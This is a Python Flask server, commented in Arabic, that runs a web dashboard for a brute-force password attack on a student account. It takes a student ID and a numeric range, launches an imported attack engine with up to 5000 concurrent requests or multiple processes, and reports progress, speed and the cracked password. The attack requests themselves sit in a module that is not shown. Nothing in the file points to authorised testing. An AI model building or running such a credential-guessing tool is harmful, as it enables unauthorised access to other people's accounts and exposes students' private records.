from flask import Flask, render_template, request, jsonify
import threading
import time
import os
import psutil
import platform
from attack_engine import UltraFastAttackEngine, MultiProcessAttackEngine

app = Flask(__name__)

# ========== إعدادات الأداء العالية ==========
USE_MULTIPROCESSING = True  # استخدام المعالجة المتعددة
CONCURRENT_REQUESTS = 5000   # 5000 طلب متزامن

# ========== حالة البحث ==========
search_active = False
current_engine = None
current_progress = 0
total_passwords = 0
found_password = None
found_location = None
successful_attempts = 0
failed_attempts = 0
search_speed = 0
instant_speed = 0
start_time = None
student_id_current = ""

def get_system_info():
    """الحصول على معلومات الجهاز"""
    return {
        'cpu': {
            'usage': psutil.cpu_percent(interval=0.1),
            'count': psutil.cpu_count(),
            'count_logical': psutil.cpu_count(logical=True),
            'frequency': psutil.cpu_freq().current if psutil.cpu_freq() else 0,
        },
        'memory': {
            'total': psutil.virtual_memory().total,
            'available': psutil.virtual_memory().available,
            'used': psutil.virtual_memory().used,
            'percent': psutil.virtual_memory().percent,
        },
        'disk': {
            'total': psutil.disk_usage('/').total,
            'used': psutil.disk_usage('/').used,
            'free': psutil.disk_usage('/').free,
            'percent': psutil.disk_usage('/').percent,
        },
        'system': {
            'platform': platform.system(),
            'platform_release': platform.release(),
            'processor': platform.processor(),
        },
        'performance': {
            'max_threads': CONCURRENT_REQUESTS,
            'multiprocessing': USE_MULTIPROCESSING,
            'cpus_available': psutil.cpu_count()
        }
    }

def run_attack(student_id, start_range, end_range):
    """تشغيل الهجوم في خلفية"""
    global search_active, current_progress, total_passwords
    global found_password, found_location, search_speed, instant_speed
    global start_time, current_engine
    
    passwords = list(range(start_range, end_range + 1))
    total_passwords = len(passwords)
    start_time = time.time()
    last_checked = 0
    
    try:
        if USE_MULTIPROCESSING:
            engine = MultiProcessAttackEngine(student_id, passwords)
        else:
            engine = UltraFastAttackEngine(
                student_id, 
                passwords,
                config={'concurrent_requests': CONCURRENT_REQUESTS}
            )
        
        current_engine = engine
        result = engine.run()
        
        if result:
            found_password = result.get('found') if isinstance(result, dict) else result
            found_location = result.get('location', '') if isinstance(result, dict) else ''
        
        # تحديث الإحصائيات
        while search_active and not found_password:
            time.sleep(0.1)
            current_progress = getattr(engine, 'checked', current_progress)
            
            # حساب السرعة
            elapsed = time.time() - start_time
            if elapsed > 0:
                current_speed = current_progress / elapsed
                search_speed = current_speed
                
                # سرعة لحظية
                speed_diff = current_progress - last_checked
                instant_speed = speed_diff / 0.1 if speed_diff else 0
                last_checked = current_progress
            
            if not getattr(engine, 'active', True):
                break
                
    except Exception as e:
        print(f"Error: {e}")
    finally:
        search_active = False

# ========== Routes ==========
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/system', methods=['GET'])
def get_system():
    return jsonify(get_system_info())

@app.route('/api/start', methods=['POST'])
def start_search():
    global search_active, found_password, found_location
    global current_progress, start_time, student_id_current
    
    data = request.json
    student_id = data.get('student_id')
    start_range = int(data.get('start_range', 100000))
    end_range = int(data.get('end_range', 109999))
    
    if not student_id:
        return jsonify({'error': 'رقم الطالب مطلوب'}), 400
    
    if search_active:
        return jsonify({'error': 'بحث قيد التشغيل'}), 400
    
    # إعادة تعيين
    search_active = True
    found_password = None
    found_location = None
    current_progress = 0
    student_id_current = student_id
    
    # بدء الهجوم في thread منفصل
    thread = threading.Thread(
        target=run_attack,
        args=(student_id, start_range, end_range)
    )
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'status': 'started',
        'total': end_range - start_range + 1,
        'mode': 'multiprocessing' if USE_MULTIPROCESSING else 'asyncio',
        'concurrent': CONCURRENT_REQUESTS
    })

@app.route('/api/stop', methods=['POST'])
def stop_search():
    global search_active
    search_active = False
    if current_engine:
        current_engine.active = False
    return jsonify({'status': 'stopped'})

@app.route('/api/status', methods=['GET'])
def get_status():
    global search_active, current_progress, total_passwords
    global found_password, found_location, search_speed, instant_speed, start_time
    
    elapsed = time.time() - start_time if start_time else 0
    remaining = total_passwords - current_progress
    
    return jsonify({
        'active': search_active,
        'found': found_password is not None,
        'found_password': found_password,
        'found_location': found_location,
        'progress': (current_progress / total_passwords) * 100 if total_passwords > 0 else 0,
        'checked': current_progress,
        'total': total_passwords,
        'remaining': remaining,
        'speed': round(search_speed, 1),
        'instant_speed': round(instant_speed, 1),
        'elapsed': int(elapsed),
        'eta': int(remaining / search_speed) if search_speed > 0 else 0
    })

if __name__ == '__main__':
    # إعدادات الأداء لـ Flask
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
